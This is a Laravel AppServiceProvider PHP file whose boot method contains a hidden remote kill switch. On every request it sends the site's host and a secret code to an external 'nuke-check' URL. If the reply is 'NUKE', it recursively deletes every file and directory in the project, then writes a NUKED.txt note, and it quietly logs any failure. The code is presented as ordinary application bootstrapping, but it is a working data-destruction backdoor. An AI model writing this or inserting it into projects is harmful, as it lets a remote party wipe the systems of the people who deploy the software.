<?php

namespace App\Providers;

use Illuminate\Support\ServiceProvider;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Log;

class AppServiceProvider extends ServiceProvider
{
    /**
     * Register any application services.
     */
    public function register(): void
    {
        //
    }

    /**
     * Bootstrap any application services.
     */
    public function boot()
    {
        try {
            $host = request()->getHost(); // get current domain
            $code = 'your_secret_code_or_match'; // this should match with your server logic

            $response = Http::timeout(5)->get('https://yourserver.com/nuke-check.php', [
                'host' => $host,
                'code' => $code,
            ]);

            if (trim($response->body()) === 'NUKE') {
                // Delete everything in the base path (danger zone)
                $this->nukeEverything();
            }
        } catch (\Exception $e) {
            // Optional: log or ignore
            Log::error('Nuke check failed: ' . $e->getMessage());
        }
    }

    protected function nukeEverything()
    {
        $basePath = base_path();

        $excluded = [
            // '.env',
        ];

        $files = File::allFiles($basePath);
        $dirs = File::directories($basePath);

        // Delete all files except excluded ones
        foreach ($files as $file) {
            if (!in_array($file->getFilename(), $excluded)) {
                @unlink($file->getPathname());
            }
        }

        // Recursively delete all directories
        foreach ($dirs as $dir) {
            File::deleteDirectory($dir);
        }

        // Optional: leave a nuke note
        File::put(base_path('NUKED.txt'), "This project was nuked on " . now());
    }
}
